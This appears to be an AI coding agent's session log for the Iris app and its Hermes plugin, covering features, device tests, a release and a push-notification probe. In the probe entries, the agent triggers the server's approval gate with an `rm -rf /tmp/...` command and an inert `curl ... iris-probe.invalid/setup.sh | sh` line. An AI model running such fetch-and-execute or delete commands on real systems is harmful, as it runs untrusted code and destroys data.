- User answers (this chat): the weekly cron is **off by default**; the guard **allows the learning tools in any session**.
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 395 pass, 1 skipped (new guard tests red first); `flutter test test/data/genui_weekly_refine_test.dart test/features/genui/genui_settings_test.dart` -> 21 pass (the logic tests red first as a compile error); `flutter analyze lib test` -> 3 pre-existing infos plus two of mine, which I then fixed (positional bool, import order; re-run of those two files' tests only). **The full `flutter test --exclude-tags live` was not completed: it was killed twice for low memory (once in 6.1, once now).** Run it once before the G7 boundary, when memory allows.
- What it does: `guards.ANY_SESSION` lets `iris_usage_summary`, `iris_template_refine`, `iris_template_list`, `iris_template_propose`, `iris_profile_get` run in any session (a cron run is not flagged); `iris_ui` and `iris_profile_propose` stay flagged-only. Plugin is now 0.3.0 with feature `refine`. App: `WeeklyRefine` (`lib/data/genui/weekly_refine.dart`) finds/creates/pauses one cron job named "Iris: refine my displays" (`0 9 * * 1`, prompt names the iris-refine skill, delivery default); `weeklyRefineProvider`; Settings row "Refine every week" (only with displays on and the `refine` feature), a failed change puts the switch back. Turning it off pauses the job rather than deleting it.
- Deviations: (1) The Settings gate is the new `refine` feature, not `feedback`. (2) The cron schedule string `0 9 * * 1` and Hermes accepting a plain cron expression are assumptions from `CronJob.schedule`; not tried live. A scheduled run's session is unflagged, so its displays are never drawn, which is the intent; whether `post_llm_call` usage rows matter there is moot (not flagged, no row).
- Decisions for later tasks: the server still runs 0.2.0; before any live check of 6.x, copy the plugin (0.3.0) over SSH as in 5.6 and restart `hermes-dashboard`.
- Next: 6.4 refinement proposals in the review screen ("changes" mode, before/after; `PUT templates/{id}` with `{"proposal": "apply"|"discard"}`; `UiTemplate` needs a `proposal` field).

### G7 — 6.4 — done — 2026-11-09 — Sonnet 5.5
- Commits: ed515c8 feat(genui): review changes to kept displays beside what they are now, apply or discard, with a badge in Displays
- Verified: new tests red first (compile errors: no `TemplateProposal`, `decideProposal`, `proposal:`), then `flutter test test/features/genui test/data/genui_personal_test.dart` -> 233 pass; `flutter analyze lib test` -> the 3 pre-existing infos plus 2 redundant-argument infos of mine, removed (tests re-run, not re-analyzed); **full `flutter test --exclude-tags live -j 2` -> 1,745 pass, 4 skipped, exit 0** (the run owed since 6.1 and 6.3). No server change, so pytest was not re-run (last: 395 pass, 1 skipped). New goldens `study_changes_{dark,light}.png` opened and looked at; the existing review goldens are unchanged.
- What it does: `UiTemplate.proposal` (`TemplateProposal`: `retire`, `reason`, revised fields; `after(template)` gives the proposed side). `GenUiApi.decideProposal(id, apply:)` sends `PUT templates/{id}` `{"proposal": "apply"|"discard"}`. The review screen now loads all templates and shows new proposals (Keep / Rename / Drop) and, below them, a card per kept template with a waiting change: reason, "Now" and "Proposed" both drawn live, Apply / Discard; a retire suggestion shows "Now" only with Retire / Keep it. "Keep all" covers only new proposals and the profile, never changes. The Displays badge counts both: "2 proposals and 1 change waiting for you".
- Deviations: (1) The review screen's request changed from `templates?status=proposed` to all templates (filtered on the device) so changes are found in the same call. (2) A refinement of the profile has no UI: the plugin keeps the profile's `previous` text only; the plan names templates.
- Decisions for later tasks: not checked live: the server still runs plugin 0.2.0 (no refine routes); a live check of 6.x needs the 0.3.0 copy installed over SSH as in 5.6, and is for the G9 device pass.
- segment G7 complete. Next: G8 (Haiku), task 7.1 demo mode.

### G8 — doing — 2026-11-09
- Running as Haiku 5.5 (G8 needs Haiku). Git matches the log (G7 `ed515c8`, in history; HEAD `2f053db`, clean apart from `store/screenshots/`).
- Next: 7.1 demo mode.

### G8 — 7.1 — done — 2026-11-09 — Haiku 5.5
- Commits: dd9953a feat(genui): demo mode shows a card, a reply kit and a study result
- Verified: `flutter test test/demo/demo_genui_test.dart` red first (no GenUI scripts; then the count was 2, not 3, and the test was corrected to the real count), then 4 pass; `flutter test test/demo` -> 45 pass; `flutter test test/features/demo_flow_test.dart` red first (the new prompts were off-screen, fixed with `ensureVisible`), then 10 pass; `flutter test test/features/demo_flow_test.dart test/design/welcome_demo_golden_test.dart` -> pass (no golden changed); `flutter analyze lib/demo test/demo test/features/demo_flow_test.dart` -> No issues found!
- Deviations: (1) Demo displays are scripted `iris_ui` tool steps; progressive rendering in chunks (the plan's optional part) is not done. (2) The "fake study result" is a scripted study chat: a profile and two proposed templates (`deploy-status`, `daily-plan`) with a reply. It does not fill the Displays or Review screens, because Settings is hidden in the demo and those screens need `GenUiApi`, which the demo does not have. (3) `demoScripts` is now `final` (it spreads `demoGenUiScripts`).
- Decisions for later tasks: demo programs live in `lib/demo/demo_genui_content.dart`; `test/demo/demo_genui_test.dart` checks them against the Iris library, so edit them only through that test.

### G8 — 7.2 — blocked — 2026-11-09
- Export: already done in the app. `chat_export.dart` writes each display's `fallback`, never its program. A test was added (`10dfafe test(genui): a shared transcript exports a display's fallback text, not its program`); `flutter test test/features/chat_export_test.dart` -> 10 pass.
- Search: blocked on a decision. Search is Hermes's own `session_search` on the server, so the app cannot index fallback text itself. A display's fallback sits in the `iris_ui` call's arguments; the plugin's answer is only `{ok, surface_id, rev}`. Whether Hermes search reads tool-call arguments or tool results is not known from here. Only a live check can show it.
- Options for the user: (a) the plugin also returns the fallback in its answer, so the stored tool row carries it (plugin 0.3.1; needs the server updated and a live search check); (b) leave search as it is, so displays are found through the reply text, which D7 already requires to make sense on its own.
- Next: the user's answer on search; then the search part of 7.2; then 7.5 (docs, noting how search treats displays).

### G8 — 7.2 — done — 2026-11-09 — Haiku 5.5
- Commits: 10dfafe (export test); the search decision is logged here, with no code change.
- Decision (the user, this chat): search stays as it is. Hermes search finds displays through their reply text (D7); the plugin does not echo fallback text into its answer and the server is not changed.
- Verified: `flutter test test/features/chat_export_test.dart` -> 10 pass.
- Deviations: 7.2 is a partial change: the export was already in the app and is now tested. Search was not changed, by decision.
- Next: 7.5 docs.

### G8 — 7.5 — done — 2026-11-09 — Haiku 5.5
- Commits: 9f6b719 docs(genui): changelog, feature section, plugin and package READMEs, and a privacy note for generated displays
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 395 pass, 1 skipped (docs only, no code changed); the README and NOTICE diffs were read against the code: the plugin routes and features (`FEATURES` in `dashboard/plugin_api.py`), the guard's any-session tools (`genui/guards.py` `ANY_SESSION`), the file list (`genui/store.py`), and the demo script count (5 + 3 = 8).
- Deviations: (1) The plan says `packages/openui_lang/NOTICE`; it now also credits the prompt goldens and the reference runtime (both MIT, Thesys Inc.), and the package README has a licence section. (2) The privacy paragraph in `site-src/src/pages/Privacy.tsx` is user-facing legal copy: it needs the user's review before it is published. The built site (`site-src/dist`) is not tracked and was not rebuilt; it changes when the site is deployed from source. (3) The server README had gone out of date (routes, skills, features); it is updated, and its "Nothing logs" line no longer claims more than the tests check. (4) The root README's demo bullet now says eight scripted turns.
- Decisions for later tasks: the privacy wording names the study's reads (memory, chats from the last 90 days, skills, scheduled jobs, task board) and the usage signals; keep them in step with `study.md` if those change.
- Next: G9 (Sonnet), 7.3 accessibility.

### G8 — 7.2 search — decision recorded — 2026-11-09
- The user chose "leave search as it is" (the option I recommended). Hermes search finds a display through the reply text around it, not through the display's own text. No server change was made, and no doc claims that displays are searchable.

### segment G8 complete — 2026-11-09
- Next: G9 (Sonnet), task 7.3 accessibility pass. 7.4 (the device pass) needs the user and a phone.

### G9 — doing — 2026-11-09
- Running as Sonnet 5.5. Git matches the log (G8 `9f6b719` in history; HEAD `e5378aa`, clean apart from `store/screenshots/`).
- Next: 7.3 accessibility pass (semantics for every component, 200 % text scale, screen-reader pass).

### G9 — 7.3 — done (automated part) — 2026-11-09 — Sonnet 5.5
- Commits: 7bb3825 test(genui): accessibility pass over every component at 200% text and 320pt; code-block Copy label meets AA contrast
- Verified: `flutter test test/features/genui/accessibility_test.dart` -> 10 pass (one program using every library component, light and dark: draws with no exception at 200 % and 100 % text and 320 pt wide; Flutter's labelled-tap-target, 44 pt tap-target and WCAG text-contrast guidelines). `flutter analyze lib/design test/features/genui` -> No issues found!. Full `flutter test --exclude-tags live -j 2` showed 15 golden diffs only (all from the Copy label change); regenerated those two files' goldens; they then passed. The rest of the suite had passed.
- Findings: (1) the code block's "Copy" label (shared markdown component) was 4.49:1 in light mode, a hair under AA; its text now mixes 20 % ink into the accent. 13 chat goldens and 2 genui "more" goldens were regenerated for that. (2) The Expander header is 44 pt, below Android's 48 pt guideline; Iris's floor is `IrisSize.minTapTarget` = 44 app-wide, so the Android guideline is not asserted and nothing was changed.
- Deviations: the plan's "screen-reader pass both platforms" (TalkBack, VoiceOver) needs a device, so it moves to 7.4 with the user. The full suite was re-run only for the goldens, not once more after regenerating.
- Next: 7.4 device pass (needs the user and a phone; include a TalkBack and VoiceOver pass, and the 0.3.0 plugin install on the server).

### G9 — 7.4 — doing — 2026-11-10
- User approved (this chat): device = Moto G45 5G (`ZN4226ZPW5`, arm64, Android only for now), install plugin 0.3.0 on the server and restart `hermes-dashboard`, real turns (>= 240 s each), and a TalkBack checklist for the user.
- Done: plugin 0.3.0 copied to `~/.hermes/plugins/iris` (tests, tools, venv left out), `hermes-dashboard` restarted: active, no plugin errors in the journal. Debug APK (arm64) built and installed over the existing app with `adb install -r` (data kept, no uninstall needed).
- Next: live checks on the phone (displays, reply kit, study, review changes, weekly refine switch), screenshots to `docs/superpowers/plans/2026-10-31-genui-device/`, TalkBack checklist for the user. iOS/VoiceOver: no device known; ask.

### G9 — 7.4 — doing (Android live part done) — 2026-11-10 — Sonnet 5.5
- Verified live on the Moto G45 5G against the user's server, plugin 0.3.0, debug arm64 build (screenshots and the TalkBack checklist: `docs/superpowers/plans/2026-10-31-genui-device/`):
  - Settings shows plugin 0.3.0 and the Study, Displays and Refine rows. The weekly switch created the cron job "Iris: refine my displays" (`0 9 * * 1`, next run 2026-11-16 09:00 UTC): **Hermes accepts the plain cron expression**. Switching it off paused the job (kept, not deleted).
  - A live turn drew a native card (stat row, checklist; an empty BarChart showed the quiet "Can't show this part" chip). A second turn updated it in place with a bar chart, a line chart, environment chips, a slider and Submit. Choosing Staging, 5 replicas and Submit sent only "Review this deployment configuration; do not deploy" in the bubble, and the model's reply said "Staging with 5 replicas": the hidden action block works end to end.
  - A fresh reply kit docked above the composer and tapping Alpha sent it and cleared the kit. The card read back from history drew from the stored surface (light, 320 pt).
- Defects found (not fixed; each needs a test first):
  1. **A reply kit whose id is reused does not dock.** `UiSurfaceItem.add` updates a display in place, so a kit the model re-sends after a user message stays before that message and `currentReplyKit` stops at the user turn. Seen with `deploy-next-step` (rev 2). Fix idea: when a kit's later call is newer than the last user turn, move it to the end. One more case is unexplained: the first `deploy-next-step` (new, rev 1, same turn as a card update) also did not dock at the end of its turn; not reproduced with a clean new id (`alpha-kit` docked).
  2. **At 320 pt a `StatRow` of three stats breaks a value mid-word** ("Unkno / wn"). The stat value should wrap on word boundaries or scale down. 3.2 and 7.3 tested no overflow, not mid-word breaks.
- Not done: light/dark pairs for every screen (only the card and home in light; the rest in dark); Study my work and the review screens (a long real run over the user's memory and chats: not started, ask first); the refine proposals (need a study first); TalkBack (the user; checklist written); iOS and VoiceOver (no iPhone/Mac known).
- Left on the user's server: three throwaway chats ("Create deploy status card...", "...Alpha Beta Gamma reply kit", plus the Alpha follow-up inside it) and display files `deploy-status`, `deploy-next-step`, `alpha-kit` under `~/.hermes/iris/default/surfaces/`. The phone's density and night mode were reset; stay-awake turned off.
- Next: the user's TalkBack results; decide on the two defects (fix before G10 or log as known); Study and Displays checks; iOS if a device exists.

### G9 — 7.4 defects fixed — 2026-11-11 — Sonnet 5.5
- Commits: 5496fd3 fix(genui): stat rows stack instead of breaking a value mid-word; a reply kit sent again docks after the person's reply
- Verified: (1) `test/features/genui/stat_row_test.dart` (new) red first ("Unknown" wrapped at 320 pt), then green; `StatRow` now measures each value against its cell and stacks in a column unless every value fits on one line (the old rule only looked at text scale and count). (2) Two tests in `reply_kit_test.dart` red first (a kit re-sent after a user turn stayed before it), then green; `UiSurfaceItem.add` moves a reply kit to the end when it is sent again, inline displays still update in place (guard test). `flutter test test/features/genui` -> 230 pass (goldens unchanged); `flutter test test/features/genui/reply_kit_test.dart test/data` -> 473 pass; `flutter analyze lib test` -> the 3 pre-existing infos only.
- Full `flutter test --exclude-tags live -j 2` -> **1,766 pass, 4 skipped, no failures**. The shell wrapper was reported killed for low memory, but the test run itself reached "All tests passed!" (read from its output file); an earlier note here said it was not completed, which was wrong.
- Deviations: the test font draws every glyph as a full square, so the "still side by side" guard uses short values ("12", "3", "40"), not "Unknown". Not re-checked on the phone yet (needs a new build); the first-`deploy-next-step` case that did not dock is still unexplained, the fix covers the reused-id case only.
- Next: rebuild and recheck both on the Moto if the user wants; TalkBack results; then G9 complete.

### G9 — 7.4 defect fixes rechecked on the phone — 2026-11-12 — Sonnet 5.5
- Rebuilt the debug arm64 APK from `571def5` and installed it on the Moto G45 over the existing app (data kept). The first builds crawled because the PC was out of memory (a 10 GB kernel paged pool that a restart cleared); the clean build took about 20 minutes.
- Verified live: (1) `StatRow` at 320 dp (density 360): Build / Services / Deploy stack one per row and "Unknown" is whole; at 280 dpi the three sit side by side. Screenshot: `2026-10-31-genui-device/android-statrow-stacked-dark-320pt.png`. (2) Reply kit with a reused id: sent "Send the same reply kit again with the same id and no other display"; after the reply the kit (Yes / No / Maybe) was docked above the composer with the person's message before it, which the old code could not do. I dismissed the kit before taking a screenshot of that state, so it is confirmed by an earlier screenshot of the docked kit, not a saved one.
- Still open in G9: TalkBack results (the user), Study my work, Displays and Review screens, refine proposals, iOS and VoiceOver (no device), and the unexplained first-`deploy-next-step` case.
- Left on the server: one more turn in the "Create deploy status card…" chat. Phone density and stay-awake were reset.
- Next: the user decides: do the Study and Displays checks now, or close G9 with those logged as gaps.

### G9 — 7.4 Study, Review and Displays on the phone; a hang found and fixed — 2026-11-13 — Sonnet 5.5
- Commits: da9be8e fix(genui): Back on Displays, Review and Study no longer hangs the app
- Verified live (Moto G45, plugin 0.3.0, user's server): **Study my work** ran in about 3 minutes and proposed a profile and 4 templates (2 displays, 2 reply kits); the review screen drew each template live with its sample and offered Keep / Rename / Drop; **Keep all** worked and the screen then read "Nothing left to review"; **Displays** listed the profile and the 4 kept items with Rename and Retire. No screenshots of these were saved (they show the user's real profile).
- **Defect found: Back hung the app (ANR, main thread at 96 % CPU) on Review, Displays and Study.** Read from a paused isolate (`getStack` over the VM service): `Navigator.maybePop` -> `PopScope` -> `IrisScaffold.onBack` -> `maybePop` -> ... The three screens passed `onBack: maybePop` to `IrisScaffold`, which sets `canPop: false` and calls `onBack` on every pop attempt, so `maybePop` re-entered the same `PopScope` forever. Present since G7; no test tapped Back on those screens. Fix: those screens no longer pass `onBack`. New test on each screen asserts its `PopScope`s have `canPop` true (red first: `Expected: true, Actual: false`, then green; finder note: `find.byType(PopScope)` misses `PopScope<Object?>`, so the test uses `w is PopScope`). `flutter test test/features/genui test/features/ui_action_send_test.dart` -> 242 pass; `flutter analyze lib/features/genui test/features/genui` -> No issues found!. Rebuilt, installed, and Back from Displays now returns to Settings with no ANR.
- `onBack` on `IrisScaffold` stays for `job_form_screen` and `voice_call_screen`, which call `pop()` directly (no loop). Rule for later: an `onBack` handler must never call `maybePop`.
- Left on the server: the approved profile and 4 kept displays from this test, plus the "Iris setup" chat. The user can retire them in Displays.
- Still open in G9: refine proposals ("changes" review; needs usage and a refine run), the user's TalkBack results, iOS and VoiceOver (no device), the unexplained first-`deploy-next-step` case. Full `flutter test --exclude-tags live` not re-run after this fix (only the genui folder).
- Next: user decides: refine check, TalkBack results, or close G9.

### G9 — full suite after the Back fix — 2026-11-13 — Sonnet 5.5
- Verified: `flutter test --exclude-tags live -j 2` -> 1,769 pass, 4 skipped, 0 failed ("All tests passed!"); was 1,766, plus the 3 new Back tests.
- Still open in G9: the user's TalkBack results, refine proposals check, iOS and VoiceOver (no device), the unexplained first-`deploy-next-step` case.

### G9 — 7.3, 7.4 — done — 2026-11-13 — Sonnet 5.5
- Commits: 7bb3825 accessibility test pass (7.3); 5496fd3 StatRow and reply-kit fixes; da9be8e Back hang fix; docs: 823fa19 and earlier.
- Verified: see the entries above. Phone (Moto G45, Android 14, plugin 0.3.0): displays, update in place, hidden action block, reply kit docking, StatRow at 320 dp, weekly switch, Study, Review (Keep all), Displays, Back. `flutter test --exclude-tags live -j 2` -> 1,769 pass, 4 skipped; `flutter analyze` -> the 3 pre-existing infos only.
- **Known gaps carried to G10 (deliberate, by the user):** (1) **TalkBack pass deferred by the user**: the checklist is `2026-10-31-genui-device/README.md`; TalkBack is installed on the phone but was hidden from its Settings menu, and was enabled and then switched off again over adb on 2026-11-13 (the other accessibility service on the phone was left as it was). (2) iOS and VoiceOver: no device. (3) Refine proposals ("changes" review) not checked on a device; needs usage and a refine run; covered by tests and goldens only. (4) The first `deploy-next-step` kit that did not dock is unexplained; the reused-id fix is verified. (5) The server still holds the approved profile, 4 kept displays and the "Iris setup" chat from the Study test, plus the throwaway chats from earlier.
- Deviations: the plan's screen-reader pass (7.3/7.4) was not done on either platform.
- segment G9 complete. Next: G10 (Opus), 7.6 final review, release (tag `hermes-iris-v0.1.0`) and PR. Do not push or open the PR until the user says so.

### G10 — 7.6 final review — done; release blocked on the user — 2026-11-13 — Opus 5.5
- Running as Opus 5.5. Git matched the log (G9 `da9be8e` in history; HEAD `6b7d880`, clean apart from `store/screenshots/`). Branch: 96 commits ahead of `main`, 0 behind (merge-base `b3caf31`).
- Review (inline, no subagents), read in full: the plugin's routes, store, paths, guards, surfaces, tool, personal, personal tools, templates, context, usage, feedback; the app's GenUI API, models, parser and envelope, controller, signals, dwell, `SurfaceBlock`, `OpenUiView`; and the branch's diff to shared files (chat backend, events, models, history parser, chat state, controller, screen, transcript, API client, design controls, markdown). Security checks held: every path component goes through `safe_component`, writes are atomic and 0600, the profile directory refuses links, routes are behind dashboard login (401 verified live in 2.12), nothing logs programs or contexts, the envelope cannot spill into visible text, links in displays stay plain text (no `onOpenUrl` host), images use the existing host allow-list, and nothing personal reaches a turn before approval (only approved template ids and names are in the context).
- Commits: 1115dc1 fix(genui): a bridged or cut-short tool call's card finishes on an ok answer.
- Defect found and fixed (test first): `_surfaceDone` treated any `tool_call`/`mcp__tool_call` answer reading `{ok: true}` as a display's answer, so a bridged call to **another** tool, or an `iris_ui` call whose arguments arrived cut short (shown as an ordinary card), kept its card spinning. Two new tests in `genui_transcript_test.dart` red (`Actual: running`), then green. Also fixed three stale comments: an orphaned doc comment in `chat_screen.dart`, and the guard and personal-tools docstrings that predated `ANY_SESSION` (the guard's refusal now says "This tool", not "iris_ui").
- Verified: `flutter test --exclude-tags live -j 2` -> 1,771 pass, 4 skipped, "All tests passed!"; `dart test` in `packages/openui_lang` -> 324 pass, 5 skipped; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 395 pass, 1 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. Plan 7.1–7.5 checkboxes ticked (done in G8/G9, never ticked).
- Noted, not changed (low risk): `usage.jsonl` rotation is locked per process only, so the agent and dashboard processes could both rotate at once and lose a few rows; signals with an unsafe template id make the plugin refuse the whole batch (the app drops it); `ANY_SESSION` lets `iris_template_propose` run from any platform's session (the user's decision in 6.3; proposals still need approval in Iris).
- **Blocked on the user:** (1) the plan's tag is `hermes-iris-v0.1.0`, but the plugin is 0.3.0 (`plugin.yaml`, `pyproject.toml`, `__init__`, manifest, CHANGELOG), so the tag name as written would mislabel it; proposed `hermes-iris-v0.3.0`. (2) Tagging, pushing and opening the PR to `main` wait for the user's say-so (run book).
- Next: the user's answers, then tag, push, PR; then G10 done and 9.2 P-spec (Opus).

### G10 — 7.6 release — done — 2026-11-13 — Opus 5.5
- User answers (this chat): tag `hermes-iris-v0.3.0` (not the plan's v0.1.0, to match the plugin version); tag, push and open the PR.
- Done: annotated tag `hermes-iris-v0.3.0` on `1115dc1`; pushed `feat/genui` and the tag to origin; PR #42 to `main`: https://github.com/shreyas-kamat/iris/pull/42 (body lists the known gaps from G9). Not merged: merging is the user's.
- Plan 7.6 ticked.
- 9.1 GenUI complete. Next: 9.2 Push notifications, P-spec (Opus): `superpowers:brainstorming`, branch `feat/push` from `main` (after #42 merges, or from `main` as it is if the user prefers).

### P-spec — doing — 2026-11-13 — Opus 5.5
- Running as Opus 5.5. Git matched the log (G10 `1115dc1` in history; HEAD `3750bda`). Branch `feat/push` cut from `feat/genui` at `3750bda` (the plugin lives there); retarget to `main` after PR #42 merges.
- Brainstormed with the user; recon read hermes-agent `f97608f` (hooks `on_session_end` per turn incl. cron, `pre_approval_request`, `post_approval_response`). Draft design: `docs/superpowers/specs/2026-11-13-push-notifications-design.md`.
- Next: the user reviews and approves the design; then P-plan (`superpowers:writing-plans`, Opus).

### P-spec — done — 2026-11-13 — Opus 5.5
- Commits: 57f5882 docs(push): draft push notifications design; log P-spec
- Verified: the user approved the design in chat ("Approved").
- Deviations: none.
- Next: P-plan (Opus), same chat per the run book.

### P-plan — done — 2026-11-13 — Opus 5.5
- Plan: `docs/superpowers/plans/2026-11-13-push.md` (12 tasks, segments PS1–PS7). Self-reviewed against the spec.
- Plan-level decisions for the user to check: approval actions open Iris after unlock and answer there (no native WebSocket client); Iris marks active chats explicitly; device settings stored on the server; replay 15 min (stream) / 10 min (APNs); `flutter_local_notifications` on Android only; the one `flutter_foreground_task` service is shared with voice through an arbiter (`microphone|remoteMessaging`).
- Next: the user reviews the plan; then PS1 (Opus), Task 1 live probe — ask before touching the server.

### PS1 — doing — 2026-11-13 — Opus 5.5
- User approved the plan and the probe ("start"). Finding (e) done over SSH (read only): the Hermes runtime (Python 3.14.7) has `httpx` 0.28.1, `cryptography` 50.0.1, `pyjwt` 2.13.0, `aiohttp`, `requests`, but **no `h2`** (httpx HTTP/2 unavailable); system `curl` 8.5.0 has HTTP2 (nghttp2). Needs the user's choice (plan step 7).
- Installing the probe hooks on the server was refused by the session's permission check (remote writes). Waiting on the user to allow it or run the install themselves.
- On disk, uncommitted: `test/live/push_probe_live_test.dart` (approval/reply/cron tests, analyze clean); probe hook module in the scratchpad (`push_probe.py`).
- Next: install the probe hooks, run the live test, read `~/.hermes/iris/probe-push.jsonl`, write findings.

### PS1 — blocked — 2026-11-13 — Opus 5.5
- Probe hooks installed with the user's permission (`~/.hermes/plugins/iris/push_probe.py` + a wrapper at the end of `__init__.py`; backup `/root/iris-init.py.bak`). Dashboard restarted; it restarted itself once more at 23:14 ("port 9119 already in use"), then stayed up.
- Findings so far: (b) the agent turn ran in a process other than the dashboard service's main pid at first, and hooks and routes share only files (plan holds). Per-turn `on_session_end` did **not** reach the plugin for dashboard turns; it fired only when a session closed (`completed: false, interrupted: true`, no `turn_id`). `post_llm_call` does fire per dashboard turn (GenUI "use" rows in `usage.jsonl`), so Task 4 should build `reply` on `post_llm_call`. Approval mode is the default `manual`, timeout default 300 s; `rm -rf` matches the dangerous patterns. The server runs a newer Hermes checkout (`0e427d788d`) than the tag read; the finalizer code is the same.
- **Blocked:** the model provider fails every turn (NVIDIA NIM `HTTP 404 Function ... Not found for account`, same as G4), so no approval can be raised and turn hooks are unreliable to judge. Needs the user to fix the server's model/provider.
- Next: after the fix, rerun `(d)`, `(reply)` (with the 60 s wait) and `(c)`; read `probe-push.jsonl`; then remove the probe and restore `/root/iris-init.py.bak`.

### PS1 — blocked — 2026-11-13 — Opus 5.5 (second run)
- User fixed the model (now `gpt-6-sol`). `(d)` with `rm -rf /tmp/...`: no `approval.request`. Hook rows show why: the server's `approvals.mode` is **smart**. `pre_approval_request` fired with `surface: "smart"`, then `post_approval_response` `choice: "smart_approve"`, `decided_by: "aux_llm"`. A person is asked only on a guardian DENY (owner override) or ESCALATE (`_smart_gate`, `tools/approval.py:761`), and that ask comes with `surface` `gateway`/`cli`. **Task 4 must not notify on `surface == "smart"`.**
- (a) answered: hook `session_key` = `session_id` = the **stored** id (`20261113_051659_b9bbb3`), not the runtime id. Hook rows also carry `turn_id` and `tool_call_id`.
- Reverses the first run's finding: with a working model, **`on_session_end` does fire per dashboard turn** (`turn_id`, `completed`/`failed`/`interrupted`, `turn_exit_reason`, `platform: "desktop"`), about 2 s after the approval response. Closing the chat fires a second `on_session_end` with no `turn_id` and `interrupted: true`. Task 4 can stay on `on_session_end`, keyed on rows that have a `turn_id`; no plan change to `post_llm_call` is needed.
- (c) partly answered by an earlier scheduled run: `on_session_end` with `session_id` `cron_<job id>_<ts>`, `task_id` `cron:<job id>:<run>`, `completed: true`.
- `(d)` rerun with an inert `curl -s http://iris-probe.invalid/setup.sh | sh`: `tool.start` arrived, then no `approval.request` and no `message.complete` within 5 min (test timed out; chat deleted). Could not read the hook rows: SSH to the server (Tailscale) timed out three times, while the dashboard answered over HTTPS (200).
- **Blocked:** need SSH back to read the rows for `20261113_051824_771c8c` and see whether a human ask was raised and why the dashboard sent no `approval.request`.

### PS1 — waiting on the user — 2026-11-13 — Opus 5.5 (third run)
- SSH back. The `curl | sh` ask did reach a person (`surface: "gateway"`) and timed out at 300 s: the dashboard sends approvals as an `approval` **server request**, which the probe wasn't listening for. Probe fixed to use `DashboardSession.serverRequests`.
- `(d)` passes: request arrives, fresh socket + resume, `approval.pending` lists it, `approval.respond` deny → `{resolved: 1}`, reply "denied". Not re-sent on the new socket.
- `(reply)` passes; `on_session_end` row has `turn_id`, `completed: true`. `(c)` own job create timed out (load ≈ 10); cron payload taken from two real scheduled runs instead; no probe job left behind. Job name read from `cron/jobs.json` (`jobs[]`, `id`/`name`).
- Findings in `docs/superpowers/plans/2026-11-13-push-probe.md`. Task 4 keeps `on_session_end` (ignore rows without `turn_id`) and must skip `surface == "smart"`.
- Probe removal on the server was refused by the auto-mode classifier; the user runs `remove-probe.ps1` from the scratchpad. Waiting on the user's h2/curl call (Task 1 Step 7).
- User chose **system `curl`** for APNs HTTP/2. Plan amended: Task 4 (preview from `post_llm_call` by `turn_id`, ignore `on_session_end` without `turn_id`, skip `surface == "smart"`, cron name from `jobs.json`, new tests) and Task 6 (`curl --http2 -K -` via stdin config, nothing secret in argv). First `remove-probe.ps1` run failed: Git Bash put Git's ssh first, which has no key; script now calls `%SystemRoot%\System32\OpenSSH\ssh.exe`. PS1 completes once the user's rerun shows `probe lines left: 0` and `active`.

### PS1 — done — 2026-11-13 — Opus 5.5
- User reran `remove-probe.ps1`: `probe lines left: 0`, dashboard `active`. Server plugin is back to the backup (`/root/iris-init.py.bak` kept); `push_probe.py` and `probe-push.jsonl` deleted. Findings `7296630`, plan amendments `50ccec3`.
- **segment PS1 complete.** Next: PS2 (Tasks 2–5) on Sonnet.

### PS2 — doing — 2026-11-13 — Sonnet 5.5
- Running as Sonnet 5.5. Git matches the log (PS1 `7296630`/`50ccec3` in history; HEAD `95eefdb`, clean apart from `store/screenshots/`).
- Next: Task 2 device registry and settings routes.

### PS2 — Task 2 — done — 2026-11-13 — Sonnet 5.5
- Commits: ef5b797 feat(push): device registry and notification settings routes
- Verified: `tests/test_push_devices.py` red first (no module, no `push_dir`), then 13 pass; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 408 pass, 1 skipped.
- Deviations: (1) `PATCH push/devices/<id>/settings` merges per event onto the stored settings (partial updates keep the rest); `PUT` replaces via `normalize_settings`. (2) `apns_configured` is for now "`<iris root>/push/apns.json` exists"; Task 6 replaces it with `apns.load_config`. (3) Settings JSON shape: `{"reply": {"on","text","mode"}, "approval": {...}, "job": {...}}`.
- Next: Task 3 active chats, outbox, rendering.

### PS2 — Tasks 3–5 — done — 2026-11-13 — Sonnet 5.5
- Commits: 67fbea2 active chats, event outbox and per-device rendering; 8fe5186 capture reply, approval and job events from Hermes hooks; 75c0113 event stream for Android devices with short replay
- Verified: each task's tests were red first (missing modules), then green. `server/hermes-iris/.venv/Scripts/python -m pytest` -> 478 pass, 2 skipped (POSIX file modes); `tools/build_skill_refs.py --check` clean (exit 0). Not run: a real Hermes (no hook, route or stream was exercised live; that waits for the PS6 device pass). Tests for hooks use the kwargs recorded in the probe, and the approval hook kwargs (`command, description, pattern_key, pattern_keys, session_key, surface`, `coalesced` on followers) were read from hermes-agent `tools/approval*.py` in an earlier scratchpad.
- Deviations: (1) A third job outcome, `failed` (render: "<name> failed"), for a cron run with `failed` or not `completed`; the plan had only completed/no_output and the hook cannot tell no-output. (2) Interrupted turns clear the active mark and emit nothing; a chat closing (no turn_id) leaves the mark. (3) A brand-new stream (no `after`) starts from the latest event, no replay; a reconnect with a cursor replays up to 15 min. The stream ends if its device is removed. (4) Chat titles: `hooks.title_for` is a stub returning None (no verified Hermes session-title API), so notices use the person's own text and `content` replies fall back to the preview. (5) `approval_done` is emitted only for chats this process announced an approval for (in-memory, cap 50); coalesced follower asks are ignored. (6) Outbox trimming is a cheap newline count plus first-line age; a trim racing another process's append can lose that one event. (7) `paths.hermes_home()` added for `cron/jobs.json`. (8) The stream polls the files from the event loop once a second (small files; not offloaded to a thread).
- Decisions for later tasks: notice JSON keys are exactly `event_id, kind, session_id, title, body, category, collapse` (`approval_done`: `event_id, kind, session_id, collapse`). Job session ids look like `cron_<job id>_<date>_<time>`: the app derives the job id from them (the notice carries no job id). Routes added: `PUT/PATCH/DELETE push/devices/{id}[/settings]`, `POST push/active/{session}`, `GET push/stream?device_id=&after=`, `GET push/status`; `capabilities.features` has `push`.
- segment PS2 complete. Next: PS3 (Opus), Task 6 APNs sender and worker.

### PS3 — Task 6: APNs sender and delivery worker — done — 2026-11-13 — Opus 5.5
- Commits: 7e9aaa0 feat(push): APNs token-auth sender and delivery worker
